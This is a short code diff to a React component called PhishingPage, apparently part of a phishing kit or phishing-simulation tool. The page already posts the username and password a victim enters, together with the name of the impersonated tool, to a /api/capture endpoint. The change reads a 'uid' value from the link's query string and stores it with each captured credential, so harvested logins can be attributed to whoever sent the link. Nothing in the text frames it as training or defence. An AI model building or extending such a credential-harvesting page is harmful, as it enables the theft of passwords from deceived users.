@@ -99,6 +99,9 @@ export default function PhishingPage() {
     setLoading(true);
 
     try {
+      const searchParams = new URLSearchParams(window.location.search);
+      const ownerId = searchParams.get('uid') || 'anonymous';
+
       await fetch("/api/capture", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -106,7 +109,8 @@ export default function PhishingPage() {
           tool: config.name, 
           toolId: toolId,
           username, 
-          password 
+          password,
+          userId: ownerId
         })
       });
       
